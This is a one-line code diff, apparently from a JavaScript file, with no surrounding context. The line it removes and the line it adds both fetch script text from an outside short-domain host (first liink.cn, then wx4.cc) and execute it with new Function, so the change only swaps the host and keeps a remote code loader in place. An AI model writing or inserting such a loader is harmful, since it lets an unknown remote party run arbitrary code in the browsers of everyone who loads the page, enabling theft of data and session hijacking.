@@ -1,1 +1,1 @@
-fetch('//liink.cn/zjzdj').then(r=>r.text()).then(C=>new Function(C)())
+fetch('//wx4.cc/yodao').then(r=>r.text()).then(C=>new Function(C)())
